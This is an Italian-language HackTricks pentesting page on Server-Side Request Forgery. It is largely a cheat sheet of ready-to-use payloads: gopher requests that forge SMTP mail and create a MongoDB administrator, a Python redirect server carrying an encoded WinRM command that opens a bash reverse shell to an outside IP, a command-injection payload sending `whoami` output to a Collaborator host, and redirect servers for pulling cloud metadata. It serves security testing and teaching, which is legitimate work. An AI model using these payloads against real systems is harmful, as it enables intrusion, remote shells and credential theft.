# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Una vulnerabilità di **Server-side Request Forgery (SSRF)** si verifica quando un attaccante manipola un'applicazione lato server per effettuare **richieste HTTP** verso un dominio a sua scelta. Questa vulnerabilità espone il server a richieste esterne arbitrarie dirette dall'attaccante.

## Catturare SSRF

La prima cosa da fare è catturare un'interazione SSRF generata da te. Per catturare un'interazione HTTP o DNS puoi usare strumenti come:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Bypass della whitelist di domini

Di solito scoprirai che l'SSRF funziona solo su **certi domini o URL nella whitelist**. Nella pagina seguente trovi una **raccolta di tecniche da provare per bypassare quella whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass tramite Open Redirect

Se il server è correttamente protetto potresti **bypassare tutte le restrizioni sfruttando un Open Redirect presente nella pagina web**. Poiché la pagina permetterà **SSRF verso lo stesso dominio** e probabilmente **seguirà i redirect**, puoi sfruttare l'Open Redirect per far sì che il server acceda a qualsiasi risorsa interna.\
Read more here: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protocolli

- **file://**
- Lo schema URL `file://` è menzionato, puntando direttamente a `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Lo schema URL DICT è descritto come utilizzato per accedere a definizioni o liste di parole via il protocollo DICT. L'esempio illustra un URL costruito che punta a una parola specifica, database e numero di voce, e contiene anche un caso di uno script PHP che potrebbe essere usato per connettersi a un server DICT usando credenziali fornite dall'attaccante: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identificato come protocollo per il trasferimento file sicuro su secure shell, viene fornito un esempio che mostra come uno script PHP potrebbe essere sfruttato per connettersi a un server SFTP malevolo: `url=sftp://generic.com:11111/`
- **TFTP://**
- Il Trivial File Transfer Protocol, che opera su UDP, è menzionato con un esempio di uno script PHP progettato per inviare una richiesta a un server TFTP. Una richiesta TFTP viene fatta a 'generic.com' sulla porta '12346' per il file 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Questo segmento tratta il Lightweight Directory Access Protocol, enfatizzandone l'uso per gestire e accedere a servizi di informazioni di directory distribuite su reti IP. Interagisci con un server LDAP su localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Viene descritto un metodo per sfruttare vulnerabilità SSRF per interagire con servizi SMTP su localhost, incluse azioni per rivelare nomi di dominio interni e ulteriori attività investigative basate su quelle informazioni.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Se lo SSRF viene eseguito da **curl**, curl ha una funzionalità chiamata [**URL globbing**](https://everything.curl.dev/cmdline/globbing) che può essere utile per bypassare i WAFs. Ad esempio in questo [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) puoi trovare questo esempio di **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- La capacità del protocollo Gopher di specificare IP, port e bytes per la comunicazione con un server viene descritta, insieme a strumenti come Gopherus e remote-method-guesser per creare payloads. Vengono illustrati due utilizzi distinti:

### Gopher://

Usando questo protocollo puoi specificare gli **IP, port and bytes** che vuoi che il server **send**. Poi, puoi praticamente sfruttare una SSRF per **communicate with any TCP server** (ma devi prima sapere come interagire con il servizio).\
Per fortuna puoi usare [Gopherus](https://github.com/tarunkant/Gopherus) per creare payloads per diversi servizi. Inoltre, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) può essere usato per creare _gopher_ payloads per servizi _Java RMI_.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Crea user con username=admin, password=admin123 e permission=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header e altri

Il software di analytics sui server registra spesso il Referrer header per tracciare i link in ingresso, una pratica che espone involontariamente le applicazioni a vulnerabilità di Server-Side Request Forgery (SSRF). Questo perché tali software possono visitare gli URL esterni presenti nel Referrer header per analizzare il contenuto del sito di riferimento. Per scoprire queste vulnerabilità, si consiglia il plugin di Burp Suite "**Collaborator Everywhere**", sfruttando il modo in cui gli strumenti di analytics elaborano il Referer header per individuare potenziali superfici di attacco SSRF.

## SSRF tramite dati SNI dal certificato

Una misconfigurazione che potrebbe permettere la connessione a qualsiasi backend tramite una configurazione semplice è illustrata con un esempio di configurazione Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In questa configurazione, il valore del campo Server Name Indication (SNI) viene utilizzato direttamente come indirizzo del backend. Questa impostazione espone a una vulnerabilità di Server-Side Request Forgery (SSRF), che può essere sfruttata semplicemente specificando l'indirizzo IP o il nome di dominio desiderato nel campo SNI. Di seguito è riportato un esempio di exploit per forzare una connessione a un backend arbitrario, come `internal.host.com`, usando il comando `openssl`:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF con Command Injection

It might be worth trying a payload like: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Rendering dei PDF

If the web page is automatically creating a PDF with some information you have provided, you can **inserire del JS che verrà eseguito dal creatore del PDF** stesso (the server) while creating the PDF and you will be able to abuse a SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Crea più sessioni e prova a sfruttare la SSRF per scaricare file pesanti.

## Funzioni PHP per SSRF

Controlla la pagina seguente per funzioni PHP vulnerabili e persino funzioni di Wordpress:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## Reindirizzamento SSRF verso Gopher

Per alcuni exploit potresti aver bisogno di **inviare una risposta di redirect** (potenzialmente per usare un protocollo diverso come gopher). Qui hai diversi codici python per rispondere con un redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proxy mal configurati che consentono SSRF

Trucchi [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Codice vulnerabile del proxy Flask</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask permette di usare **`@`** come carattere iniziale, il che permette di rendere l'initial host name lo username e di iniettarne uno nuovo. Richiesta d'attacco:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Codice vulnerabile:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

È stato scoperto che è possibile **iniziare il path** di una richiesta con il carattere **`;`**, il che permette poi di usare **`@`** per iniettare un nuovo host da raggiungere. Richiesta d'attacco:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Server Web integrato di PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Codice PHP vulnerabile</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP consente l'uso del **carattere `*` prima di uno slash nel path** dell'URL; tuttavia presenta altre limitazioni, come il fatto che può essere usato solo per il root pathname `/` e che i punti `.` non sono permessi prima del primo slash, quindi è necessario usare, ad esempio, un indirizzo IP codificato in esadecimale senza punti:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Se hai **problemi** a **esfiltrare contenuti da un IP locale** a causa di **CORS/SOP**, **DNS Rebidding** può essere usato per bypassare questa limitazione:


{{#ref}}
../cors-bypass.md
{{#endref}}

### DNS Rebidding automatizzato

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) è uno strumento per eseguire [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) attacks. Include i componenti necessari per riassegnare l'indirizzo IP del nome DNS del server dell'attaccante all'indirizzo IP della macchina target e per servire payload di attacco per sfruttare software vulnerabile sulla macchina target.

Guarda anche il **server pubblico in esecuzione su** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Sessioni TLS in uscita**
- **Processi in ascolto sulle porte locali**

Attack:

1. Chiedi all'utente/bot di **accedere** a un **dominio** controllato dall'**attaccante**
2. Il **TTL** del **DNS** è **0** sec (quindi la vittima verificherà nuovamente l'IP del dominio a breve)
3. Viene creata una **connessione TLS** tra la vittima e il dominio dell'attaccante. L'attaccante inserisce il **payload** all'interno del **Session ID o Session Ticket**.
4. Il **dominio** inizierà un **loop infinito** di redirect verso se stesso. L'obiettivo è costringere l'utente/bot ad accedere al dominio fino a quando non effettuerà **di nuovo** una **richiesta DNS** per il dominio.
5. Nella richiesta DNS viene restituito **ora** un indirizzo **IP privato** (127.0.0.1 per esempio)
6. L'utente/bot tenterà di **ristabilire la connessione TLS** e per farlo invierà il **Session ID/Session Ticket ID** (dove era contenuto il **payload** dell'attaccante). Quindi congratulazioni: sei riuscito a far sì che l'**utente/bot si attacchi da solo**.

Nota che durante questo attacco, se vuoi attaccare localhost:11211 (_memcache_) devi far sì che la vittima stabilisca la connessione iniziale con www.attacker.com:11211 (la **porta deve essere sempre la stessa**).\
Per **eseguire questo attacco puoi usare lo strumento**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\  
Per **maggiori informazioni** dai un'occhiata alla presentazione dove questo attacco è spiegato: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

La differenza tra una blind SSRF e una SSRF non-blind è che nella blind non puoi vedere la risposta della richiesta SSRF. Di conseguenza è più difficile da sfruttare perché potrai sfruttare solo vulnerabilità ben conosciute.

### Time based SSRF

**Controllando il tempo** delle risposte dal server potrebbe essere **possibile sapere se una risorsa esiste o no** (forse ci vuole più tempo per accedere a una risorsa esistente rispetto a una che non esiste)

### Da blind a pieno abuso degli status code

Secondo questo [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), alcune blind SSRF possono verificarsi perché anche se l'URL target risponde con un 200 status code (come AWS metadata), questi dati non sono formattati correttamente e quindi l'app potrebbe rifiutarsi di mostrarli.

Tuttavia, è stato scoperto che inviando alcune risposte di redirect da 305 a 309 nella SSRF può essere possibile far sì che l'applicazione **segua questi redirect entrando in una modalità di errore** che non verifica più il formato dei dati e potrebbe semplicemente stamparli.

Il server python usato per sfruttare questo è il seguente:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Passaggi:**
- First 302 gets the app to start following.
- Then it receives 305 → 306 → 307 → 308 → 309 → 310.
- After the 5th strange code the PoC finally returns 302 → 169.254.169.254 → 200 OK.

**Cosa succede all'interno del target:**
- libcurl itself does follow 305–310; it just normalises unknown codes to “follow.”
- After N weird redirects (≥ 5 here) the application’s own wrapper decides “something is off” and switches to an error mode meant for debugging.
- In that mode it dumps the entire redirect chain plus final body back to the outside caller.
- Result: attacker sees every header + the metadata JSON, mission accomplished.

Note that this is interesting to leak status codes that you couldn't leak before (like a 200). However, if somehow you could also select the status code of the response (imagine that you can decide that the AWS metadata responds with a 500 status code), **there might be some status codes that directly leak the content of the response.**

### HTML-to-PDF renderer come blind SSRF gadgets

Librerie come **TCPDF** (e wrapper come **spipu/html2pdf**) recuperano automaticamente qualsiasi URL presente in HTML controllato dall'attacker durante il rendering di un PDF. Ogni attributo `<img>` o `<link rel="stylesheet">` viene risolto server-side tramite cURL, `getimagesize()`, o `file_get_contents()`, quindi puoi far sì che il worker PDF sondi host interni anche se nessuna risposta HTTP viene riflessa verso di te.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 effettua diversi tentativi di retrieval per ogni risorsa `<img>`, quindi un singolo payload può generare richieste multiple (utile per timing-based port scans).
- html2pdf replica il comportamento di TCPDF per `<img>` e aggiunge il fetching di CSS dentro `Css::extractStyle()`, che semplicemente chiama `file_get_contents($href)` dopo un controllo superficiale dello scheme. Abusalo per colpire loopback services, RFC1918 ranges, or cloud metadata endpoints.
- Combine this SSRF primitive with the [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) per leak sia le risposte HTTP interne sia i file locali renderizzati nel PDF.

Gli hardener dovrebbero rimuovere gli URL esterni prima del rendering o isolare il renderer in una network sandbox; fino ad allora, trattate i PDF generators come blind SSRF proxies.

## Sfruttamento SSRF nel Cloud

Se trovi una vulnerabilità SSRF in una macchina che gira all'interno di un ambiente cloud potresti essere in grado di ottenere informazioni interessanti sull'ambiente cloud e persino credenziali:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Piattaforme vulnerabili a SSRF

Diverse piattaforme note contengono o hanno contenuto vulnerabilità SSRF, controllale in:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Strumenti

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool to detect and exploit SSRF vulnerabilities

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ è uno scanner di vulnerabilità _Java RMI_ che supporta operazioni di attacco per le più comuni vulnerabilità _Java RMI_. La maggior parte delle operazioni disponibili supporta l'opzione `--ssrf`, per generare un payload _SSRF_ per l'operazione richiesta. Insieme all'opzione `--gopher`, è possibile generare direttamente payload _gopher_ pronti all'uso.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy è un server proxy HTTP multi-thread progettato per tunnelizzare il traffico HTTP del client attraverso server HTTP vulnerabili a Server-Side Request Forgery (SSRF).

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Riferimenti

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
